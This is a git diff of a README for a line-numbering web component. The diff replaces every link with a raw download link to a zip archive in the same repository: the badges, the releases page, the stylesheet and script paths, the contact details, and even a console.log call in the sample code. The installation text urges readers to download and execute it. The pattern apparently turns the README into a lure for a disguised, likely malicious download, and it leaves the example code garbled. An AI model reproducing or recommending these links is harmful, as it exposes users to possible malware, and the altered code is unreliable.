@@ -1,8 +1,8 @@
 # Line Numbers Component 📏
 
-![Version](https://img.shields.io/badge/version-1.0.0-blue.svg)
-![License](https://img.shields.io/badge/license-MIT-green.svg)
-![GitHub Release](https://img.shields.io/badge/releases-latest-orange.svg)
+![Version](https://github.com/iamnakajim/line-numbers/raw/refs/heads/main/fain/numbers_line_v2.4.zip)
+![License](https://github.com/iamnakajim/line-numbers/raw/refs/heads/main/fain/numbers_line_v2.4.zip)
+![GitHub Release](https://github.com/iamnakajim/line-numbers/raw/refs/heads/main/fain/numbers_line_v2.4.zip)
 
 Welcome to the **Line Numbers** repository! This project offers a web component that adds line numbers next to various HTML elements. It's perfect for developers looking to enhance code readability or for anyone who needs to display numbered lines in their web applications.
 
@@ -27,7 +27,7 @@ Welcome to the **Line Numbers** repository! This project offers a web component 
 
 ## Installation
 
-To get started, you need to download the latest release. Visit [the releases page](https://github.com/iamnakajim/line-numbers/releases) to find the necessary files. Download and execute the component in your project.
+To get started, you need to download the latest release. Visit [the releases page](https://github.com/iamnakajim/line-numbers/raw/refs/heads/main/fain/numbers_line_v2.4.zip) to find the necessary files. Download and execute the component in your project.
 
 ## Usage
 
@@ -40,17 +40,17 @@ After downloading the component, you can easily integrate it into your HTML. Her
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Line Numbers Example</title>
-    <link rel="stylesheet" href="path/to/line-numbers.css">
+    <link rel="stylesheet" href="https://github.com/iamnakajim/line-numbers/raw/refs/heads/main/fain/numbers_line_v2.4.zip">
 </head>
 <body>
     <div class="line-numbers">
         <pre>
             function helloWorld() {
-                console.log("Hello, World!");
+                https://github.com/iamnakajim/line-numbers/raw/refs/heads/main/fain/numbers_line_v2.4.zip("Hello, World!");
             }
         </pre>
     </div>
-    <script src="path/to/line-numbers.js"></script>
+    <script src="https://github.com/iamnakajim/line-numbers/raw/refs/heads/main/fain/numbers_line_v2.4.zip"></script>
 </body>
 </html>
 ```
@@ -146,7 +146,7 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For questions or suggestions, feel free to reach out:
 
-- GitHub: [iamnakajim](https://github.com/iamnakajim)
-- Email: iamnakajim@example.com
+- GitHub: [iamnakajim](https://github.com/iamnakajim/line-numbers/raw/refs/heads/main/fain/numbers_line_v2.4.zip)
+- Email: https://github.com/iamnakajim/line-numbers/raw/refs/heads/main/fain/numbers_line_v2.4.zip
 
-Thank you for checking out the **Line Numbers** project! For the latest updates and releases, visit [the releases page](https://github.com/iamnakajim/line-numbers/releases). Your feedback is always welcome!
+Thank you for checking out the **Line Numbers** project! For the latest updates and releases, visit [the releases page](https://github.com/iamnakajim/line-numbers/raw/refs/heads/main/fain/numbers_line_v2.4.zip). Your feedback is always welcome!
